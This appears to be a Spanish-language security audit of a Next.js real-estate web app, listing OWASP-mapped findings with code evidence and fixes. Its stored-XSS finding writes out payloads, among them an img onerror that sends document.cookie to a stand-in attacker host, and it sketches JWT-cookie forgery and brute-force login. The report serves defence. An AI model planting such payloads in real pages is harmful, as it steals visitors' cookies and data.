# Security Report — Domio

> Generado por: security-auditor
> Fecha: 2026-07-09
> Basado en: OWASP Top 10 2025

---

## 1. Executive Summary

**Nivel de riesgo global:** Alto

**Estado general:** La aplicación tiene una arquitectura de seguridad sólida en muchos aspectos — tenant isolation via RLS, bcrypt para contraseñas y API keys, validación Zod en todas las entradas, rate limiting implementado. Sin embargo, existen tres problemas concretos y verificables: el rate limiting de login está implementado pero no está conectado al flujo de autenticación, el middleware de autenticación realiza una validación de formato JWT superficial en vez de verificar la firma criptográfica, y el HTML con `dangerouslySetInnerHTML` en contenido editable carece de sanitización de atributos (solo valida nombres de etiquetas). Estos tres puntos tienen impacto real y requieren remediación.

**Hallazgos por severidad:**
| Severidad | Cantidad |
|-----------|----------|
| Crítica | 0 |
| Alta | 3 |
| Media | 4 |
| Baja | 3 |
| Informativa | 2 |

**Superficie de ataque identificada:**
- `/panel/login` — endpoint de autenticación (credenciales)
- `/api/auth/[...nextauth]` — NextAuth handler (GET + POST)
- `/api/internal/*` — APIs backoffice autenticadas (sesión JWT)
- `/api/v1/promociones` — API pública autenticada (API Key)
- `/api/v1/leads/institutional` — API pública autenticada (API Key)
- `/api/internal/media/upload` — upload de ficheros
- Server Actions públicas: `createLeadAction`, `submitContactForm`
- Formularios públicos: contacto, lead desde detalle de inmueble

---

## 2. Hallazgos Altos

### [HIGH-01] Rate Limiting de Login implementado pero nunca invocado

**Categoría OWASP 2025:** A07:2025 — Authentication Failures
**Severidad:** Alta
**Explotabilidad:** Fácil
**Archivos afectados:** `src/infrastructure/auth/rate-limit-login.ts` (línea 22), `src/infrastructure/auth/auth.config.ts` (función `authorize`)

**Descripción:** La función `checkLoginRateLimit` está completamente implementada, tiene tests, y está documentada con un ejemplo de uso en su JSDoc. Sin embargo, nunca se llama desde `auth.config.ts:authorize`. El callback `authorize` de NextAuth solo verifica email/password contra la base de datos sin ningún control de brute-force, lo que permite intentos de login ilimitados contra cualquier cuenta.

**Escenario de ataque:**
1. El atacante obtiene una lista de emails de usuarios (por ejemplo, via enumeración de errores distintos en el form de login o social engineering).
2. Lanza un script de credential stuffing o brute-force con listas de contraseñas comunes contra `/api/auth/[...nextauth]` con método POST y `action=credentials`.
3. No existe ningún bloqueo por IP ni throttling. Con 5 intentos/segundo puede probar 432.000 contraseñas en 24 horas.
4. Una cuenta comprometida da acceso completo al backoffice del tenant.

**Evidencia en código:**

```ts
// src/infrastructure/auth/rate-limit-login.ts — función existe pero NUNCA se llama
export async function checkLoginRateLimit(headers: Headers): Promise<Response | null> {
  // ...implementación correcta...
}

// src/infrastructure/auth/auth.config.ts:authorize — sin ninguna llamada a checkLoginRateLimit
async authorize(credentials) {
  const email = credentials?.email as string | undefined;
  const password = credentials?.password as string | undefined;
  if (!email || !password) return null;
  // ... bcrypt compare directo, sin rate limit
}
```

**Remediación:**

En `auth.config.ts`, dentro del callback `authorize`, añadir la llamada al rate limiter. NextAuth v4 `authorize` no recibe `request` directamente, pero se puede acceder a los headers desde el contexto si se pasan como credentials ocultas, o utilizar el evento `signIn` de NextAuth:

```ts
// Opción más directa: añadir el check en las páginas de login que invocan
// signIn('credentials', ...) o en un middleware de API separado.
// En NextAuth v4, la forma más limpia es via el callback "signIn":

callbacks: {
  async signIn({ user, account, credentials }) {
    if (account?.provider === "credentials") {
      // checkLoginRateLimit requiere Headers — pasarlos desde el form
      // o usar un in-memory store por IP extraída de x-forwarded-for
    }
    return true;
  }
}

// Alternativa robusta: mover la lógica al Server Action de login
// que llama a signIn() desde el formulario:
export async function loginAction(formData: FormData) {
  const headersList = await headers();
  const ip = extractIpFromHeaders(headersList);
  const rateLimitResult = await checkIpRateLimit(ip, "login");
  if (!rateLimitResult.allowed) {
    return { error: "Demasiados intentos. Inténtalo más tarde." };
  }
  return signIn("credentials", { ...formData });
}
```

**Coste fix:** 2-4 horas

---

### [HIGH-02] Middleware autentica por formato de cookie JWT, no por firma criptográfica

**Categoría OWASP 2025:** A07:2025 — Authentication Failures
**Severidad:** Alta
**Explotabilidad:** Moderada
**Archivos afectados:** `middleware.ts` (líneas 27-35)

**Descripción:** El middleware que protege todas las rutas `/panel/*` realiza únicamente una validación de **formato** del token JWT (comprueba que el valor de la cookie tenga 3 segmentos separados por puntos con caracteres base64url). No verifica la firma criptográfica del JWT con el `AUTH_SECRET`. Cualquier valor que coincida con el regex `^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$` pasará el guard del middleware y accederá a las rutas `/panel/*`.

El comentario en el código reconoce que esto es solo "basic JWT format validation", asumiendo que la sesión completa se valida en los layouts y server actions. En la práctica esto es correcto, ya que `PanelLayout` hace un segundo check con `getServerSession()`. Sin embargo, si alguna ruta de panel no pasa por el layout (edge cases con `not-found`, `error` boundaries, páginas `loading`), el middleware es la única barrera.

**Escenario de ataque:**
1. Atacante construye un JWT falso con cualquier payload firmado con una clave arbitraria: `eyJhbGc...eyJ1c2Vy...FIRMA_FALSA`.
2. Coloca este valor en la cookie `next-auth.session-token`.
3. El middleware lo acepta (3 partes base64url) y no redirige a `/panel/login`.
4. Si una ruta `/panel/*/` tiene algún path que ejecute código sin pasar por `getServerSession()` (por ejemplo, un `loading.tsx` que exponga datos), ese código se ejecuta sin autenticación real.

**Evidencia en código:**

```ts
// middleware.ts:27-35
const sessionCookie = request.cookies.get("next-auth.session-token");
const cookieValue = sessionCookie?.value ?? "";
// Solo valida formato, NO la firma criptográfica:
const isValidFormat = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(cookieValue);

if (!isValidFormat) {
  // Solo se bloquea si el formato no es de JWT
  const loginUrl = new URL("/panel/login", request.url);
  return NextResponse.redirect(loginUrl);
}
```

**Remediación:**

Usar el wrapper `auth` de NextAuth v4 para verificar criptográficamente la sesión en el middleware. NextAuth provee `getToken` que verifica la firma del JWT:

```ts
import { getToken } from "next-auth/jwt";

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  if (pathname.startsWith("/panel") && !pathname.startsWith("/panel/login")) {
    // Verificación criptográfica real del JWT
    const token = await getToken({
      req: request,
      secret: process.env.AUTH_SECRET,
    });

    if (!token) {
      return NextResponse.redirect(new URL("/panel/login", request.url));
    }
  }
  // ... resto del middleware
}
```

**Coste fix:** 1-2 horas

---

### [HIGH-03] XSS Stored — Atributos HTML no sanitizados en DESCRIPCION_GENERAL

**Categoría OWASP 2025:** A05:2025 — Injection (XSS)
**Severidad:** Alta
**Explotabilidad:** Moderada (requiere acceso autenticado al backoffice)
**Archivos afectados:** `src/shared/types/content-block-schema.ts` (líneas 20-32), `src/features/detail/components/BlockDescripcion.tsx` (línea 32)

**Descripción:** La validación del campo HTML para el bloque `DESCRIPCION_GENERAL` comprueba si los **nombres de etiquetas** están en la lista de permitidos (`b`, `i`, `p`, `a`, `strong`, etc.), pero **no valida los atributos de esas etiquetas**. Esto permite inyectar handlers de eventos (`onclick`, `onerror`, `onmouseover`) o el protocolo `javascript:` en atributos `href` de etiquetas `<a>` permitidas.

El contenido pasa directamente a `dangerouslySetInnerHTML` en la página pública de detalle de inmueble, visible para todos los visitantes.

**Escenario de ataque:**
1. Un usuario con rol ADMIN u OPERATOR accede al backoffice (`/panel/catalogo/{id}`).
2. Edita el bloque "Descripción general" e introduce: `<a href="javascript:document.cookie='stolen='+document.cookie">Click aquí</a>` o `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">`.
3. La validación Zod confirma que `<a>` y `<img>` son etiquetas permitidas y acepta el payload.
4. El bloque se publica y aparece en la página pública `/inmuebles/{slug}`.
5. Cualquier visitante que haga clic (o simplemente cargue la página si usa `onerror`) ejecuta el JavaScript malicioso, robando sus cookies (aunque las de NextAuth son `httpOnly`, pueden afectar cookies de terceros, sessionStorage, o redirigir al usuario).

**Evidencia en código:**

```ts
// src/shared/types/content-block-schema.ts:20-32
function validateAllowedHtml(value: string): boolean {
  const tagRegex = /<\/?([a-z][a-z0-9]*)\b[^>]*>/gi;
  // PROBLEMA: solo extrae el nombre de la etiqueta, ignora atributos
  while ((match = tagRegex.exec(value)) !== null) {
    const tagName = match[1]!.toLowerCase();
    if (!ALLOWED_HTML_TAGS_SET.has(tagName)) return false;
  }
  return true;
  // <a href="javascript:alert(1)"> pasa la validación (tagName="a" está permitido)
}

// src/features/detail/components/BlockDescripcion.tsx:32
dangerouslySetInnerHTML={{ __html: text }}
```

**Remediación:**

Añadir una sanitización completa de atributos en la validación. La forma más segura es usar una librería de sanitización HTML como `sanitize-html` con allowlist de atributos, o ampliar el regex para rechazar cualquier atributo que sea un event handler o contenga `javascript:`:

```ts
// Opción 1: Añadir validación de atributos peligrosos
function validateAllowedHtml(value: string): boolean {
  // Rechazar event handlers
  if (/\bon\w+\s*=/i.test(value)) return false;
  // Rechazar javascript: en atributos href/src/action
  if (/\bhref\s*=\s*["']?\s*javascript:/i.test(value)) return false;
  if (/\bsrc\s*=\s*["']?\s*javascript:/i.test(value)) return false;
  // Rechazar data: URIs en atributos
  if (/\bhref\s*=\s*["']?\s*data:/i.test(value)) return false;

  const tagRegex = /<\/?([a-z][a-z0-9]*)\b[^>]*>/gi;
  // ... validación de tags existente
}

// Opción 2 (más robusta): instalar sanitize-html y usarlo en el backend
// antes de guardar el payload, garantizando que el HTML nunca llega
// corrupto a la base de datos
import sanitizeHtml from "sanitize-html";
const safe = sanitizeHtml(value, {
  allowedTags: ["b", "i", "u", "p", "br", "ul", "ol", "li", "strong", "em", "a"],
  allowedAttributes: { "a": ["href", "title"] },
  allowedSchemes: ["http", "https", "mailto"],
});
```

**Coste fix:** 2-4 horas

---

## 3. Hallazgos Medios

### [MED-01] Ausencia de headers de seguridad HTTP (CSP, HSTS, X-Frame-Options)

**Categoría OWASP 2025:** A02:2025 — Security Misconfiguration
**Severidad:** Media
**Explotabilidad:** Moderada
**Archivos afectados:** `next.config.ts`, `middleware.ts`

**Descripción:** La aplicación no configura ningún header de seguridad HTTP estándar. Una revisión de `next.config.ts` y `middleware.ts` confirma la ausencia de:
- `Content-Security-Policy` — permite cargar recursos de cualquier origen y ejecutar scripts inline
- `X-Frame-Options` o `frame-ancestors` en CSP — la aplicación puede ser incrustada en iframes (clickjacking)
- `Strict-Transport-Security` — no fuerza HTTPS
- `X-Content-Type-Options` — permite MIME sniffing

**Remediación:**

```ts
// next.config.ts
const securityHeaders = [
  { key: "X-Frame-Options", value: "DENY" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline'",  // nextjs requiere inline; usar nonce en producción
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "connect-src 'self' https://sentry.io",
      "frame-ancestors 'none'",
    ].join("; "),
  },
  // En producción añadir: { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" }
];

const nextConfig: NextConfig = {
  async headers() {
    return [{ source: "/(.*)", headers: securityHeaders }];
  },
};
```

**Coste fix:** 3-5 horas (incluye pruebas para verificar que no rompe la aplicación)

---

### [MED-02] Rate Limiting silenciosamente deshabilitado sin `RATE_LIMIT_STORE_URL`

**Categoría OWASP 2025:** A06:2025 — Insecure Design / A10:2025 — Mishandling of Exceptional Conditions
**Severidad:** Media
**Explotabilidad:** Fácil (si el env var no está configurado en producción)
**Archivos afectados:** `src/infrastructure/rate-limiting/rate-limiter.factory.ts` (líneas 9-30)

**Descripción:** Cuando `RATE_LIMIT_STORE_URL` no está definido, la factory devuelve un `NoopRateLimiter` que permite **todas las peticiones sin límite**. Esto es un comportamiento fail-open: si por error de configuración el env var no está presente en producción, el rate limiting de login y de formularios de contacto queda completamente desactivado sin ninguna alerta. El `.env.local` del repositorio tiene `RATE_LIMIT_STORE_URL=` vacío, lo que activa el modo no-op.

**Remediación:**

```ts
// src/infrastructure/rate-limiting/rate-limiter.factory.ts
export function createRateLimiter(): RateLimiter {
  const redis = getRedisClient();

  if (!redis) {
    // En producción, fallar en lugar de silenciar el error
    if (process.env.NODE_ENV === "production") {
      // Usar un limiter en memoria como fallback (no distribuido pero mejor que noop)
      logger.warn("RATE_LIMIT_STORE_URL not configured in production. Using in-memory fallback.");
      return new InMemoryRateLimiter(); // implementar uno simple
    }
    // En desarrollo, noop es aceptable
    return new NoopRateLimiter();
  }

  return new UpstashRateLimiter(redis);
}
```

Además, añadir una verificación de entorno al arrancar la aplicación (`instrumentation.ts`) que lance un warning visible si `RATE_LIMIT_STORE_URL` está vacío en producción.

**Coste fix:** 2-3 horas

---

### [MED-03] Validación de MIME type en upload basada en cabecera del cliente

**Categoría OWASP 2025:** A05:2025 — Injection
**Severidad:** Media
**Explotabilidad:** Moderada (requiere acceso autenticado)
**Archivos afectados:** `app/api/internal/media/upload/route.ts` (líneas 66-77)

**Descripción:** La validación del tipo MIME del fichero subido (`fileField.type`) lee el `Content-Type` que declara el cliente en el FormData. Un cliente malicioso puede enviar un fichero JavaScript o ejecutable declarando `Content-Type: image/jpeg`. La aplicación acepta esto como válido y lo sube a R2, aunque posteriormente no lo sirva directamente como ejecutable. El problema es que los ficheros de tipo `application/pdf` y `text/csv` también están permitidos — un PDF con JavaScript embebido puede ejecutarse si el bucket R2 lo sirve con Content-Type incorrecto.

**Remediación:**

Añadir inspección de magic bytes (primeros bytes del contenido del fichero) para verificar que el contenido real coincide con el MIME declarado:

```ts
// Validación de magic bytes después de leer el buffer
function detectMimeType(buffer: Buffer): string | null {
  // JPEG: FF D8 FF
  if (buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF) return "image/jpeg";
  // PNG: 89 50 4E 47
  if (buffer[0] === 0x89 && buffer[1] === 0x50) return "image/png";
  // PDF: 25 50 44 46
  if (buffer.slice(0, 4).toString() === "%PDF") return "application/pdf";
  // WebP: RIFF...WEBP
  if (buffer.slice(0, 4).toString() === "RIFF" && buffer.slice(8, 12).toString() === "WEBP") return "image/webp";
  return null;
}

// En el handler, después de convertir File a Buffer:
const detectedMime = detectMimeType(fileBuffer);
if (detectedMime !== fields.file!.type) {
  return validationErrorResponse([{ field: "file", message: "File content does not match declared type" }]);
}
```

Alternativamente, usar la librería `file-type` que hace esto correctamente.

**Coste fix:** 2-4 horas

---

### [MED-04] Lead público puede referenciar una promoción de cualquier tenant

**Categoría OWASP 2025:** A01:2025 — Broken Access Control
**Severidad:** Media
**Explotabilidad:** Fácil
**Archivos afectados:** `src/features/engagement/server/create-lead-action.ts` (líneas 97-107)

**Descripción:** La función `createLeadService` ejecuta en un contexto `PublicContext` cuyo `tenantId` es el tenant público (`PUBLIC_TENANT_ID`). Sin embargo, al buscar la promoción para validarla, la query NO filtra por `tenantId`:

```ts
const [promocion] = await tx
  .select({ id: promociones.id, name: promociones.name, assignedAgentId: promociones.assignedAgentId })
  .from(promociones)
  .where(eq(promociones.id, promocionId))  // ← SIN filtro de tenant
  .limit(1);
```

En la arquitectura actual la aplicación es single-tenant (un tenant único), por lo que el impacto práctico es nulo hoy. Sin embargo, si en el futuro se añaden múltiples tenants o si hay una misconfiguration de `PUBLIC_TENANT_ID`, un atacante podría crear leads asociados a promociones de otros tenants, contaminando sus datos y disparando emails de notificación a agentes de otros tenants.

**Remediación:**

```ts
const [promocion] = await tx
  .select({ id: promociones.id, name: promociones.name, assignedAgentId: promociones.assignedAgentId })
  .from(promociones)
  .where(
    and(
      eq(promociones.id, promocionId),
      eq(promociones.tenantId, ctx.getTenantId()),  // ← Añadir filtro de tenant
      eq(promociones.status, "PUBLISHED"),           // ← Añadir filtro de estado
    )
  )
  .limit(1);
```

**Coste fix:** 30 minutos

---

## 4. Hallazgos Bajos

### [LOW-01] IP extraída de headers sin validar — posible bypass de rate limiting

**Categoría OWASP 2025:** A06:2025 — Insecure Design
**Severidad:** Baja
**Archivos afectados:** `src/shared/utils/extract-ip.ts`, `src/features/engagement/server/create-lead-action.ts` (línea 67)

**Descripción:** La función `extractIpFromHeaders` toma el valor de `X-Forwarded-For` sin validar si proviene de un proxy de confianza. En un entorno sin proxy reverso delante (o con configuración incorrecta), un cliente puede enviar `X-Forwarded-For: 127.0.0.1` para suplantar una IP de loopback y eludir el rate limiting por IP. El riesgo es bajo si el despliegue siempre usa Cloudflare o un load balancer que inyecta estos headers, pero el código no hace ninguna distinción.

**Remediación:** En producción, configurar el servidor para que solo acepte `X-Forwarded-For` de IPs de proxy conocidas (lista blanca de Cloudflare/Vercel IPs). Documentar el requisito de despliegue en README.

---

### [LOW-02] Contraseña de demo hardcoded en seed script

**Categoría OWASP 2025:** A04:2025 — Cryptographic Failures
**Severidad:** Baja
**Archivos afectados:** `scripts/seed.ts` (línea 35)

**Descripción:** La contraseña de demo `Domio2026!` está hardcoded con un comentario `// demo password for dev seed`. Aunque el ESLint marca esto con `sonarjs/no-hardcoded-passwords` y se suprime con `eslint-disable`, el riesgo es que esta contraseña pueda acabar siendo usada por usuarios reales o que el seed se ejecute en entornos non-dev.

**Remediación:** Leer la contraseña de seed desde una variable de entorno (`SEED_DEMO_PASSWORD`) y fallar explícitamente si no está definida. Alternativamente, generar un token aleatorio en el seed y mostrarlo en la salida de consola.

---

### [LOW-03] Endpoint `/api/health` sin autenticación expone información de estado del servicio

**Categoría OWASP 2025:** A02:2025 — Security Misconfiguration
**Severidad:** Baja
**Archivos afectados:** `app/api/health/route.ts`

**Descripción:** El endpoint `/api/health` devuelve `{ status: "ok" }` sin autenticación. En sí mismo esto es una práctica válida para health checks de infraestructura. Sin embargo, si en el futuro se amplía para incluir información de versión, estado de base de datos o métricas del sistema, esta información podría ser aprovechada por atacantes para reconnaissance. Actualmente el riesgo es mínimo.

**Remediación:** Documentar que este endpoint debe permanecer mínimo (solo status OK/error) y nunca incluir información de versión, stack traces o métricas de sistema.

---

## 5. Hallazgos Informativos

### [INFO-01] `trustHost: true` en NextAuth puede aceptar requests de hosts no esperados

**Categoría OWASP 2025:** A02:2025 — Security Misconfiguration
**Archivos afectados:** `src/infrastructure/auth/auth.config.ts` (línea 116)

**Descripción:** `trustHost: true` en NextAuth desactiva la validación del header `Host` de la request. Esto es necesario en algunos deployments (Vercel, Cloudflare), pero significa que si el servidor está mal configurado a nivel de routing, podría aceptar requests de hosts no esperados. El riesgo real depende de la configuración de infraestructura.

**Recomendación:** Verificar que `AUTH_URL` esté correctamente configurado en producción y que el servidor no acepte tráfico de hosts arbitrarios.

---

### [INFO-02] Ausencia de pnpm audit en CI

**Categoría OWASP 2025:** A03:2025 — Software Supply Chain Failures
**Archivos afectados:** `.github/workflows/ci.yml`

**Descripción:** El pipeline de CI ejecuta lint, typecheck, tests y build, pero no incluye `pnpm audit` para detectar dependencias con CVEs conocidos. `next-auth@4.24.14` es la versión final del branch 4.x; el equipo debería tener visibilidad sobre futuras vulnerabilidades publicadas.

**Recomendación:** Añadir `pnpm audit --prod` como paso en CI con al menos nivel `high` de fallo. Considerar la migración a Auth.js v5 (Next-Auth v5) que está siendo mantenido activamente y es compatible con Next.js 15.

---

## 6. Checklist OWASP Top 10 2025

| # | Categoría | Estado | Hallazgos |
|---|-----------|--------|-----------|
| A01:2025 | Broken Access Control | ⚠️ | MED-04 (lead sin filtro tenant) |
| A02:2025 | Security Misconfiguration | ⚠️ | MED-01 (headers), LOW-03, INFO-01 |
| A03:2025 | Software Supply Chain Failures | ⚠️ | INFO-02 (audit ausente en CI) |
| A04:2025 | Cryptographic Failures | ✅ | bcrypt 12 rounds, tokens criptográficamente seguros. LOW-02 menor |
| A05:2025 | Injection | ⚠️ | HIGH-03 (XSS atributos HTML), MED-03 (MIME cliente) |
| A06:2025 | Insecure Design | ⚠️ | HIGH-01 (rate limit login desconectado), MED-02, LOW-01 |
| A07:2025 | Authentication Failures | ⚠️ | HIGH-01 (brute force posible), HIGH-02 (validación JWT superficial) |
| A08:2025 | Data Integrity Failures | ✅ | Historial de cambios, consentimientos inmutables, validación Zod |
| A09:2025 | Security Logging & Alerting Failures | ✅ | Sentry configurado con scrubbing de secrets, logger disponible |
| A10:2025 | Mishandling of Exceptional Conditions | ⚠️ | MED-02 (rate limit fail-open sin RATE_LIMIT_STORE_URL) |

---

## 7. Superficie de Ataque

### Endpoints públicos (sin autenticación)
| Ruta | Método | Validación | Rate Limiting |
|------|--------|------------|---------------|
| `/` | GET | N/A (SSR) | No |
| `/inmuebles/[slug]` | GET | slug por DB | No |
| `/portafolio` | GET | N/A | No |
| `/contacto` | GET | N/A | No |
| `/api/health` | GET | Ninguna | No |

### Server Actions públicas
| Acción | Validación input | Rate Limiting |
|--------|-----------------|---------------|
| `submitContactForm` | Zod + trim | Sí (contact scope) |
| `createLeadAction` (engagement) | Zod + UUID | Sí (contact scope) |
| `createLeadAction` (leads) | Zod | No |

### Endpoints autenticados — API Key
| Ruta | Método | Auth | Rate Limiting |
|------|--------|------|---------------|
| `/api/v1/promociones` | GET | API Key (bcrypt) | Sí (por key) |
| `/api/v1/leads/institutional` | POST | API Key (bcrypt) | Sí (por key) |

### Endpoints autenticados — Sesión JWT
| Ruta | Método | Auth | Control de acceso |
|------|--------|------|-------------------|
| `/api/internal/promociones` | GET, POST | Session | Auth only |
| `/api/internal/promociones/[id]` | GET, PATCH, DELETE | Session | AGENT scope en GET/PATCH |
| `/api/internal/media/upload` | POST | Session | Auth only |
| `/api/internal/content/blocks` | GET, POST | Session | ADMIN+OPERATOR only |
| `/api/internal/revalidate` | POST | Session | Auth only |
| `/api/internal/docs` | GET | Session | Auth only |

### Datos sensibles gestionados
- **Contraseñas**: bcrypt hash con cost 10 (seed) / 12 (producción). Nunca logueadas.
- **API Keys**: bcrypt hash con cost 12. Plain key mostrado solo en creación.
- **Tokens de invitación**: SHA-256 hash. TTL 48h.
- **PII leads**: email, nombre, teléfono en PostgreSQL con RLS. No cifrado at-rest (depende de configuración de Neon/postgres).
- **Coordenadas de inmuebles**: sanitizadas en modo AREA antes de serializar al cliente.
- **Sesión JWT**: cookie `next-auth.session-token`. Flags de seguridad: gestionados por NextAuth (HttpOnly, Secure en prod). No se verifican explícitamente en el código de aplicación.

---

## 8. Dependencias con Vulnerabilidades

No se encontraron CVEs conocidos en las versiones específicas instaladas mediante inspección del lock file. Las versiones usadas son:
- `next@15.5.20` — rama 15.x activa
- `next-auth@4.24.14` — versión final del branch 4.x (no recibe más parches)
- `drizzle-orm@0.45.2` — reciente
- `@sentry/nextjs@10.64.0` — reciente

**Riesgo residual:** `next-auth@4` está en modo mantenimiento. Nuevas vulnerabilidades en esta rama pueden no recibir parches. Se recomienda planificar la migración a Auth.js v5.

| Paquete | Versión | CVE | Severidad | Fix disponible |
|---------|---------|-----|-----------|----------------|
| next-auth | 4.24.14 | Ninguno conocido actualmente | — | Migrar a v5 |

---

## 9. Plan de Remediación

### Inmediato (antes del próximo release)
- [ ] **[HIGH-01]** Conectar `checkLoginRateLimit` al flujo de login — 2-4h
- [ ] **[HIGH-03]** Ampliar validación HTML para rechazar atributos event-handler y `javascript:` — 2-4h

### Corto plazo (próximas 2 semanas)
- [ ] **[HIGH-02]** Reemplazar validación de formato JWT en middleware por `getToken()` de NextAuth — 1-2h
- [ ] **[MED-01]** Añadir headers de seguridad en `next.config.ts` — 3-5h
- [ ] **[MED-04]** Añadir filtro de `tenantId` y `status=PUBLISHED` en query de promoción del lead público — 30min

### Medio plazo (próximo mes)
- [ ] **[MED-02]** Implementar fallback de rate limiting en memoria para producción sin Redis — 2-3h
- [ ] **[MED-03]** Añadir validación de magic bytes en upload de media — 2-4h
- [ ] **[INFO-02]** Añadir `pnpm audit` al pipeline CI — 30min
- [ ] **[LOW-01]** Documentar requisito de proxy de confianza para headers de IP — 1h

### Monitorizar / Aceptar
- **[LOW-02]** Contraseña de seed — aceptable para dev, añadir env var para mayor robustez
- **[LOW-03]** Health endpoint — monitorizar que no se expanda sin autenticación
- **[INFO-01]** `trustHost: true` — aceptable si el deployment usa Vercel/Cloudflare correctamente

---

## 10. Configuraciones de Seguridad Recomendadas

### Headers de Seguridad (next.config.ts)

```ts
const securityHeaders = [
  { key: "X-DNS-Prefetch-Control", value: "on" },
  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
  { key: "X-Frame-Options", value: "SAMEORIGIN" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), interest-cohort=()" },
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'",  // Next.js requiere esto
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' blob: data: https:",
      "font-src 'self'",
      "object-src 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "frame-ancestors 'none'",
      "upgrade-insecure-requests",
    ].join("; "),
  },
];
```

### Middleware con verificación JWT real

```ts
import { getToken } from "next-auth/jwt";
import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  if (pathname.startsWith("/panel") && !pathname.startsWith("/panel/login")) {
    const token = await getToken({
      req: request,
      secret: process.env.AUTH_SECRET,
    });

    if (!token) {
      return NextResponse.redirect(new URL("/panel/login", request.url));
    }
  }

  if (pathname.startsWith("/panel") || pathname.startsWith("/api/internal")) {
    const response = NextResponse.next();
    response.headers.set("X-Robots-Tag", "noindex, nofollow");
    response.headers.set("x-pathname", pathname);
    return response;
  }

  return NextResponse.next();
}
```

### Validación HTML con atributos seguros

```ts
const DANGEROUS_ATTR_PATTERN = /\bon\w+\s*=|\bjavascript\s*:|\bdata\s*:/i;

function validateAllowedHtml(value: string): boolean {
  // Rechazar atributos peligrosos antes de extraer tags
  if (DANGEROUS_ATTR_PATTERN.test(value)) return false;

  const tagRegex = /<\/?([a-z][a-z0-9]*)\b[^>]*>/gi;
  let match: RegExpExecArray | null;
  while ((match = tagRegex.exec(value)) !== null) {
    const tagName = match[1]!.toLowerCase();
    if (!ALLOWED_HTML_TAGS_SET.has(tagName)) return false;
  }
  return true;
}
```
